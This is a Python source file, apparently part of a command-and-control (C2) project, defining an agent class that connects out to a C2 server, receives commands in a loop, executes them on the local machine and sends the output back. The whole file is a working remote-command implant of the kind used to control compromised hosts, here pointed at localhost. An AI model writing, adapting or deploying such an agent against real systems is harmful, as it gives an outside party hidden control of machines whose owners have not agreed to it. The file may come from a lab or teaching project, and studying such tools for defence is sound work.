# agent.py
import socket
import sys
import os

# Add parent directory to path to ensure utils and execution can be imported
base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(base_dir)
sys.path.append(os.path.join(base_dir, "agent"))

from agent.execution import execute_command
from utils.comms import send_msg, recv_msg

class C2Agent:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.agent = None

    def connect(self):
        try:
            self.agent = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.agent.connect((self.host, self.port))
            print(f"Connected to C2 server at {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"Connection failed: {e}")
            return False

    def run(self):
        while True:
            try:
                # Receive command using the new protocol
                data = recv_msg(self.agent)
                if data is None:
                    print("Connection closed by server.")
                    break
                
                command = data.decode().strip()
                if not command:
                    continue
                    
                print(f"Received command: {command}")
                
                # Execute command
                result = execute_command(command)
                
                # Send result back using the new protocol
                send_msg(self.agent, result)
                    
            except Exception as e:
                print(f"Error in agent loop: {e}")
                break
        self.close()

    def close(self):
        if self.agent:
            self.agent.close()

if __name__ == "__main__":
    c2_agent = C2Agent("localhost", 8080)
    if c2_agent.connect():
        c2_agent.run()